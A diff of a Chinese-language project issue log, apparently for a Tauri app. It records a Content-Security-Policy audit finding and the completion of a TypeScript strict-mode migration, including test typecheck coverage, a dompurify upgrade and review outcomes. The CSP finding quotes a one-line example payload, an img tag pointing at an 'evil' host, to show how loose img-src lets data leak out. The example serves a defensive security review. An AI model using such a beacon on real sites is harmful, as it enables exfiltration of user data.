@@ -62,11 +62,11 @@
 - **发现:** `tauri.conf.json:31` script-src 同时含 `'unsafe-eval' 'unsafe-inline'`，CSP 对 XSS 失去第二道拦截价值，DOMPurify 白名单成为唯一防线；`img-src http: https:` 是现成数据外泄通道（`<img src="https://evil/?d=...">` 绕过 `connect-src 'self'`）。img-src 的放开是 ISS-110/ISS-178 有意为之（外部图床图片加载），需产品层面权衡。
 - **建议:** 排查 Vditor/KaTeX/Mermaid 对 eval 的真实依赖逐项灰度摘除；保留并测试锚定 `connect-src 'self'`。
 
-#### ⬜→🖥 ISS-203 TypeScript strict 迁移（进行中,分支 fix/iss203-ts-strict,2026-08-29）
+#### ✅ ISS-203 TypeScript strict 迁移（已 PR #155,2026-08-29 squash merge e7258f2,详见 [DEC-142](DECISIONS.md)）
 
 - **发现:** `config/tsconfig.app.json` 与 `tsconfig.node.json` 均未开启 `strict`（`noImplicitAny` / `strictNullChecks` 缺省关闭），对以字符串管道为主的项目事故面偏大。
 - **建议:** 分两步：先开 `strictNullChecks` 修完编译错，再补齐其余 strict 开关；CI typecheck 已是门槛，一次性收益明显。
-- **推进（2026-08-29）:** 实测生产代码 96 文件 full strict 零错误,「分两步」不需要,一步到位 `strict: true`。49 条 strict 错误全部落在测试文件——根因是测试文件此前被 `exclude` 完全排除在 typecheck 外（盲区）。修法：24 个测试文件逐条修类型（未使用 React 导入 12、mock 泛型与 props 漂移、protected rootKey/never 收窄等）；新增 `config/tsconfig.test.json`（strict + vitest types）接入 `tsc -b` references,测试文件从此纳入 typecheck。顺带：npm `edgesOut` 报错经 `rm -rf node_modules && npm ci` 未复现于 homebrew npm,根因为 hermes npm 自带 arborist 8.0.5 缺陷——已记入 ISS-204 备注。验证 781/781 + lint + typecheck + build 全绿。
+- **收口:** 实测生产 96 文件 full strict 零错误,「分两步」不需要,一步到位 `strict: true`。**根因性发现:49 条 strict 错误全部落在测试文件——测试文件此前被 tsconfig.app.json exclude,`npm run typecheck` 从未编译过任何 `*.test.ts(x)`（覆盖面盲区）**。修法：24 个测试文件逐条修类型（未使用 React 导入 12、mock 泛型与 props 漂移、protected rootKey/never 收窄等,语义零改动）；新增 `config/tsconfig.test.json` 接入 `tsc -b` references,typecheck 覆盖生产+测试+构建脚本。顺带:dompurify 3.4.3→3.4.14（audit 清零）、npm `edgesOut` 根因=hermes arborist 8.0.5 缺陷（记 ISS-204 备注）。**review 两轮:初审 NEEDS-FIXES（2 MAJOR:lockfile 未随 package.json 提交致 `npm ci` 装 3.4.3 / DEC-141 撞号改 DEC-142）→ 修复 9842a73 → 复核 APPROVE**。验证 781/781 + lint + typecheck + build + audit 0 + CI 双绿。
 
 #### ⬜ ISS-204 依赖升级批次（低风险小版本）
 
